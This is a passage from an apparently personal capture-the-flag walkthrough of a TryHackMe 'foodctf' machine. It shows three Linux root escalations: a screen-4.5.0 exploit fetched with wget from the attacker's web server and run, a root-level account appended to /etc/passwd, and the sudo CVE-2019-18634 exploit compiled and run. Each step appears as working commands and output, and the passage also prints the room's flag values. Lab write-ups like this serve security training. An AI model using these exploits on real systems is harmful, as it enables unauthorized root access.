/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/vif-0/net/eth0/flags
/usr/src/linux-headers-4.15.0-91/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.15.0-91-generic/include/config/arch/uses/high/vma/flags.h
/home/tryhackme/flag7
/home/bread/flag
/var/flag.txt
food@foodctf:~$ cat /var/flag.txt
thm{0c48608136e6f8c86aecdb5d4c3d7ba8}

food@foodctf:~$ ls -l /home/tryhackme/flag7
-rw-rw---- 1 tryhackme tryhackme 38 Mar 27  2020 /home/tryhackme/flag7
food@foodctf:~$ ls -l /home/bread/flag
----r--r-- 1 bread bread 38 Mar 28  2020 /home/bread/flag

3 flags

food@foodctf:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Jan  8  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/8689/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8689/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8689/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8689/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/8689/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8689/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8689/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8689/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8689/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/8689/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8689/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            1.6M Mar 20  2020 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root   root            146K Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root   root            2.6M Jun  6  2019 /usr/bin/vim.basic
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   telnetd          11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

/usr/bin/screen-4.5.0

https://www.exploit-db.com/exploits/41154

┌──(witty㉿kali)-[~/Downloads]
└─$ nano screenroot.sh    
                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000                
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.241.181 - - [18/Feb/2023 12:24:26] "GET /screenroot.sh HTTP/1.1" 200 -

food@foodctf:~$ cd /tmp
food@foodctf:/tmp$ wget http://10.8.19.103:8000/screenroot.sh
--2023-02-18 17:24:26--  http://10.8.19.103:8000/screenroot.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1152 (1.1K) [text/x-sh]
Saving to: ‘screenroot.sh’

screenroot.sh               100%[========================================>]   1.12K  --.-KB/s    in 0s      

2023-02-18 17:24:26 (112 MB/s) - ‘screenroot.sh’ saved [1152/1152]

food@foodctf:/tmp$ chmod +x screenroot.sh 
food@foodctf:/tmp$ ./screenroot.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-food.

# whoami
root


after executing koth 😂

# ␊│␋├
°⎺⎺␍@°⎺⎺␍␌├°:/├└⎻$ ┌⎽
°           ⎽␌⎼␊␊┼⎼⎺⎺├.⎽␤                                                                      ├└┤│-1002
┌␋␉␤▒│.⎽⎺   ⎽␌⎼␊␊┼⎽                                                                            ├└┤│-1003
┌␋┼⎻␊▒⎽.⎽␤  ⎽≤⎽├␊└␍-⎻⎼␋┴▒├␊-614␌␌45266␊24␌36▒␉7892▒0␍49␌▒090-⎽≤⎽├␊└␍-⎼␊⎽⎺┌┴␊␍.⎽␊⎼┴␋␌␊-␍␍JD⎺I   ├└┤│-1004
⎼⎺⎺├⎽␤␊┌┌   ⎽≤⎽├␊└␍-⎻⎼␋┴▒├␊-614␌␌45266␊24␌36▒␉7892▒0␍49␌▒090-⎽≤⎽├␊└␍-├␋└␊⎽≤┼␌␍.⎽␊⎼┴␋␌␊-⎻YP±9├
°⎺⎺␍@°⎺⎺␍␌├°:/├└⎻$ ┌⎽

──(witty㉿kali)-[~/Downloads]
└─$ ssh food@10.10.241.181 
food@10.10.241.181's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 18 17:28:27 UTC 2023

  System load:  0.0               Processes:           103
  Usage of /:   44.3% of 9.78GB   Users logged in:     0
  Memory usage: 56%               IP address for eth0: 10.10.241.181
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 18 17:17:45 2023 from ip-10-8-19-103.eu-west-1.compute.internal
food@foodctf:~$ cd /tmp
food@foodctf:/tmp$ ls
-bash: ls: No such file or directory
food@foodctf:/tmp$ ls -lah
-bash: ls: No such file or directory
food@foodctf:/tmp$ exit
logout
Connection to 10.10.241.181 closed.
                                                                                                             
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh ramen@10.10.241.181                                      
ramen@10.10.241.181's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 18 17:29:15 UTC 2023

  System load:  0.0               Processes:           100
  Usage of /:   44.3% of 9.78GB   Users logged in:     0
  Memory usage: 55%               IP address for eth0: 10.10.241.181
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 18 16:52:54 2023 from 10.8.19.103
ramen@foodctf:~$ cd /tmp
ramen@foodctf:/tmp$ ls -lah
total 888K
drwxrwxrwt 13 root  root  4.0K Feb 18 17:24 .
drwxr-xr-x 24 root  root  4.0K Mar 19  2020 ..
prw-r--r--  1 bread bread    0 Feb 18 16:47 f
drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .font-unix
drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .ICE-unix
-rwxrwxr-x  1 food  food  7.9K Feb 18 17:24 libhax.so
-rwxr-xr-x  1 bread bread 809K Feb 10 20:38 linpeas.sh
-rwsr-xr-x  1 root  root  8.3K Feb 18 17:24 rootshell
-rwxrwxr-x  1 food  food  1.2K Feb 18 17:23 screenroot.sh
drwxr-xr-x  3 root  food  4.0K Feb 18 17:24 screens
drwx------  3 root  root  4.0K Feb 18 16:07 systemd-private-614cc45266e24c36ab7892a0d49ca090-systemd-resolved.service-ddJDoI
drwx------  3 root  root  4.0K Feb 18 16:07 systemd-private-614cc45266e24c36ab7892a0d49ca090-systemd-timesyncd.service-pYPg9t
drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .Test-unix
drwx------  2 pasta pasta 4.0K Feb 18 17:03 tmux-1002
drwx------  2 ramen ramen 4.0K Feb 18 16:48 tmux-1003
drwx------  2 bread bread 4.0K Feb 18 16:35 tmux-1004
drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .X11-unix
drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .XIM-unix
ramen@foodctf:/tmp$ ./rootshell 
# whoami
root

I see food user doesn't have much permission

# cat /home/tryhackme/flag7
thm{5a926ab5d3561e976f4ae5a7e2d034fe}
# cat /home/bread/flag                            
thm{7baf5aa8491a4b7b1c2d231a24aec575}
# cd /root
# ls   
flag  king.txt	koth
# cat flag
thm{9f1ee18d3021d135b03b943cc58f34db}
# echo 'WittyAle' >> king.txt
# cat king.txt
kingWittyAle

6 flags

# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@foodctf:/root# find / -type f -name flag8 2>/dev/null

root@foodctf:/root# grep -Ri thm{
.profile:# thm{237741b0835c77a30a4a7ef3393f8a7d}
.mysql_history:INSERT\040INTO\040User\040VALUES\040('flag',\040'thm{2f30841ff8d9646845295135adda8332}');

7 flags cz mysql is the same like before

root@foodctf:/root# grep -Ri thm{
.profile:# thm{237741b0835c77a30a4a7ef3393f8a7d}
.mysql_history:INSERT\040INTO\040User\040VALUES\040('flag',\040'thm{2f30841ff8d9646845295135adda8332}');
flag:thm{9f1ee18d3021d135b03b943cc58f34db}
root@foodctf:/root# ls -lah
total 7.1M
drwx------  4 root root 4.0K Mar 30  2020 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
-rw-r--r--  1 root root   38 Mar 28  2020 flag
-rw-r--r--  1 root root   13 Feb 18 17:31 king.txt
-rwxr-xr-x  1 root root 7.1M Mar 19  2020 koth
drwxr-xr-x  3 root root 4.0K Mar 19  2020 .local
-rw-------  1 root root  850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root  206 Mar 28  2020 .profile
drwx------  2 root root 4.0K Mar 19  2020 .ssh
-rw-r--r--  1 root root  173 Mar 20  2020 .wget-hsts
root@foodctf:/root# cd /home
root@foodctf:/home# grep -Ri thm{
tryhackme/flag7:thm{5a926ab5d3561e976f4ae5a7e2d034fe}
grep: pasta/.gnupg/S.gpg-agent.extra: No such device or address
grep: pasta/.gnupg/S.gpg-agent.browser: No such device or address
grep: pasta/.gnupg/S.gpg-agent: No such device or address
grep: pasta/.gnupg/S.gpg-agent.ssh: No such device or address
grep: bread/.gnupg/S.gpg-agent.extra: No such device or address
grep: bread/.gnupg/S.gpg-agent.browser: No such device or address
grep: bread/.gnupg/S.gpg-agent: No such device or address
grep: bread/.gnupg/S.gpg-agent.ssh: No such device or address
bread/flag:thm{7baf5aa8491a4b7b1c2d231a24aec575}
food/.flag:thm{58a3cb46855af54d0660b34fd20a04c1}
root@foodctf:/home# cd /var
root@foodctf:/var# grep -Ri thm{
flag.txt:thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
log/auth.log:thm{4675c55160bb806ef39172976bc0aa5f}

log/auth.log:thm{4675c55160bb806ef39172976bc0aa5f}

last flag 

8 :)

another way

┌──(witty㉿kali)-[~/Downloads]
└─$ mkpasswd -m sha-512 Password1234
$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1

vim /etc/passwd


dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
food:x:1001:1001:,,,:/home/food:/bin/bash
mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
bread:x:1004:1004:,,,:/home/bread:/bin/bash

-- INSERT -- 

copy it

┌──(witty㉿kali)-[~/Downloads]
└─$ witty:$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1:0:0:witty:/root:/bin/bash

Rq1:0:0:witty:/root:/bin/bash
:wqa!

ramen@foodctf:/tmp$ tail /etc/passwd
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
food:x:1001:1001:,,,:/home/food:/bin/bash
mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
bread:x:1004:1004:,,,:/home/bread:/bin/bash
witty:$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1:0:0:witty:/root:/bin/bash

ramen@foodctf:/tmp$ su witty
Password: Password1234
root@foodctf:/tmp# :)

another way

One more privesc. We noticed earlier that we got asterisks when entering our password for Sudo. There was a recent CVE (2019-18634) that affects sudo when this option is configured. The option is called PWFEEDBACK

https://www.exploit-db.com/exploits/47995

ramen@foodctf:/tmp$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
[sudo] password for ramen: Segmentation fault (core dumped)

https://github.com/saleemrashid/sudo-cve-2019-18634

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
Cloning into 'sudo-cve-2019-18634'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 30 (delta 14), reused 22 (delta 8), pack-reused 0
Receiving objects: 100% (30/30), 5.95 KiB | 870.00 KiB/s, done.
Resolving deltas: 100% (14/14), done.
                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ cd sudo-cve-2019-18634   
                                                        
┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ ls
exploit.c  LICENSE  Makefile  README.md

┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ make                            
cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
                                                        
┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ ls
exploit  exploit.c  LICENSE  Makefile  README.md

┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.241.181 - - [18/Feb/2023 13:06:10] "GET /exploit HTTP/1.1" 200 -

ramen@foodctf:/tmp$ wget http://10.8.19.103:8000/exploit
--2023-02-18 18:06:10--  http://10.8.19.103:8000/exploit
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 841784 (822K) [application/octet-stream]
Saving to: ‘exploit’

exploit                     100%[========================================>] 822.05K   253KB/s    in 3.2s    

2023-02-18 18:06:13 (253 KB/s) - ‘exploit’ saved [841784/841784]

ramen@foodctf:/tmp$ chmod +x exploit
ramen@foodctf:/tmp$ ./exploit
[sudo] password for ramen: 
Sorry, try again.
# whoami
root

:)

3 ways , 8 flags

```

![[Pasted image 20230218111735.png]]

![[Pasted image 20230218115725.png]]

Get all 8 flags.

 Completed



[[Android Malware Analysis]]